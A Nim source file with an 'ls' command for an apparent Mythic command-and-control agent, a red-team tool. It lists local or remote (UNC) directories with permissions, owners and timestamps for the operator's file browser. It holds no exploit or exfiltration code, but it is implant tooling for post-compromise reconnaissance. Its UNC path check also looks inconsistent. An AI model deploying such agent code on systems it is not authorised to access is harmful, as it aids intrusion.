import json, os, strutils
when defined(posix):
  import posix
when defined(windows):
  import times

type
  FileInfo = object
    isFile: bool
    permissions: JsonNode
    name: string
    fullName: string
    accessTime: int64
    modifyTime: int64
    size: int64
    owner: string

proc getFilePermissions(path: string): JsonNode =
  ## Get file permissions in Mythic format
  var acls = newJArray()
  
  when defined(posix):
    var statBuf: Stat
    if stat(path.cstring, statBuf) == 0:
      # Convert Unix permissions to string format (rwxrwxrwx)
      var perms = ""
      # Owner permissions
      perms.add(if (statBuf.st_mode and S_IRUSR.Mode) != 0: 'r' else: '-')
      perms.add(if (statBuf.st_mode and S_IWUSR.Mode) != 0: 'w' else: '-')
      perms.add(if (statBuf.st_mode and S_IXUSR.Mode) != 0: 'x' else: '-')
      # Group permissions
      perms.add(if (statBuf.st_mode and S_IRGRP.Mode) != 0: 'r' else: '-')
      perms.add(if (statBuf.st_mode and S_IWGRP.Mode) != 0: 'w' else: '-')
      perms.add(if (statBuf.st_mode and S_IXGRP.Mode) != 0: 'x' else: '-')
      # Other permissions
      perms.add(if (statBuf.st_mode and S_IROTH.Mode) != 0: 'r' else: '-')
      perms.add(if (statBuf.st_mode and S_IWOTH.Mode) != 0: 'w' else: '-')
      perms.add(if (statBuf.st_mode and S_IXOTH.Mode) != 0: 'x' else: '-')
      
      acls.add(%*{
        "account": "owner",
        "rights": perms,
        "type": "Unix Permissions",
        "is_inherited": false
      })
  else:
    # Windows - basic permissions
    try:
      let info = getFileInfo(path)
      var rights = "rwx"  # Basic default for Windows
      
      acls.add(%*{
        "account": "user",
        "rights": rights,
        "type": "Windows Permissions",
        "is_inherited": false
      })
    except:
      # Fallback if we can't get permissions
      acls.add(%*{
        "account": "user",
        "rights": "---",
        "type": "Unknown",
        "is_inherited": false
      })
  
  result = %*{
    "acl": acls
  }

proc getFileOwner(path: string): string =
  ## Get file owner name
  when defined(posix):
    var statBuf: Stat
    if stat(path.cstring, statBuf) == 0:
      # Try to get username from UID
      var pwd = getpwuid(statBuf.st_uid)
      if pwd != nil and pwd.pw_name != nil:
        return $pwd.pw_name
      else:
        # Fallback to UID if username lookup fails
        return $statBuf.st_uid
    return "unknown"
  elif defined(windows):
    # For Windows, return empty string (matches oopsie behavior)
    # Full Windows implementation would use GetNamedSecurityInfo API
    return ""

proc getFileInfoObj(path: string): FileInfo =
  ## Get detailed file information
  try:
    when defined(posix):
      # Use stat directly for more reliable metadata
      var statBuf: Stat
      if stat(path.cstring, statBuf) != 0:
        raise newException(OSError, "Failed to stat file")
      
      result.isFile = S_ISREG(statBuf.st_mode)
      result.permissions = getFilePermissions(path)
      result.name = extractFilename(path)
      result.fullName = expandFilename(path)
      # Convert timestamps to milliseconds (st_atime/st_mtime are in seconds)
      result.accessTime = int64(statBuf.st_atime) * 1000
      result.modifyTime = int64(statBuf.st_mtime) * 1000
      result.size = statBuf.st_size
      result.owner = getFileOwner(path)
    else:
      # Windows - use getFileInfo
      let info = getFileInfo(path)
      result.isFile = info.kind == pcFile
      result.permissions = getFilePermissions(path)
      result.name = extractFilename(path)
      
      # Get absolute path for Windows
      try:
        result.fullName = absolutePath(path)
      except:
        result.fullName = expandFilename(path)
      
      # Convert Time to milliseconds since epoch
      # Handle edge cases where times might be invalid
      try:
        let accessUnix = info.lastAccessTime.toUnix()
        let modifyUnix = info.lastWriteTime.toUnix()
        # Only use timestamps if they're reasonable (after 1970)
        if accessUnix > 0:
          result.accessTime = accessUnix * 1000
        else:
          result.accessTime = 0
        
        if modifyUnix > 0:
          result.modifyTime = modifyUnix * 1000
        else:
          result.modifyTime = 0
      except:
        # If conversion fails, use 0
        result.accessTime = 0
        result.modifyTime = 0
      
      result.size = info.size
      result.owner = getFileOwner(path)
  except:
    # Fallback for files we can't access
    result.isFile = false
    result.permissions = %*{"acl": []}
    result.name = extractFilename(path)
    result.fullName = path
    result.accessTime = 0
    result.modifyTime = 0
    result.size = 0
    result.owner = "unknown"

proc getPlatform(): string =
  ## Get current platform string
  when defined(windows):
    return "Windows"
  elif defined(linux):
    return "Linux"
  else:
    return "Unknown"

proc executeLs*(params: JsonNode): JsonNode =
  ## Execute the ls command - list directory contents in Mythic file browser format
  
  var targetPath = "."
  var host = ""
  
  if params != nil:
    if params.hasKey("path"):
      let pathStr = params["path"].getStr()
      if pathStr.len > 0:
        targetPath = pathStr
    if params.hasKey("host"):
      host = params["host"].getStr()
  
  # Expand and validate path
  try:
    # Build UNC path if host is provided
    if host.len > 0:
      # Remove leading/trailing backslashes from path
      var cleanPath = targetPath.strip(chars = {'\\', '/'})
      # Build UNC path: \\host\share
      targetPath = "\\\\" & host & "\\" & cleanPath
    
    # Handle UNC paths (\\\\server\\share) and absolute paths
    when defined(windows):
      # Normalize path separators for Windows
      targetPath = targetPath.replace("/", "\\")
    
    if not targetPath.isAbsolute() and not targetPath.startsWith("\\\\\\\\"):
      targetPath = getCurrentDir() / targetPath
    
    # For UNC paths, walkDir will fail if the path doesn't exist
    # So we can skip the dirExists check for UNC paths
    let isUNC = targetPath.startsWith("\\\\\\\\")
    if not isUNC and not dirExists(targetPath):
      return %*{
        "user_output": "Error: Path does not exist or is not a directory: " & targetPath,
        "completed": true,
        "status": "error"
      }
    
    # Build files list
    var filesList = newJArray()
    for kind, path in walkDir(targetPath):
      try:
        let fileInfo = getFileInfoObj(path)
        filesList.add(%*{
          "is_file": fileInfo.isFile,
          "permissions": fileInfo.permissions,
          "name": fileInfo.name,
          "full_name": fileInfo.fullName,
          "access_time": fileInfo.accessTime,
          "modify_time": fileInfo.modifyTime,
          "size": fileInfo.size,
          "owner": fileInfo.owner
        })
      except:
        # Skip files we can't access
        continue
    
    # Get parent path
    let parentPath = parentDir(targetPath)
    let dirName = extractFilename(targetPath)
    
    # Build file browser response
    # Use 0 for directory-level timestamps (not individual files)
    result = %*{
      "host": host,
      "platform": getPlatform(),
      "is_file": false,
      "permissions": getFilePermissions(targetPath),
      "name": dirName,
      "parent_path": parentPath,
      "success": true,
      "access_time": 0,
      "modify_time": 0,
      "creation_date": 0,
      "size": 0,
      "update_deleted": true,
      "files": filesList
    }
    
  except Exception as e:
    result = %*{
      "user_output": "Error listing directory: " & e.msg,
      "completed": true,
      "status": "error"
    }
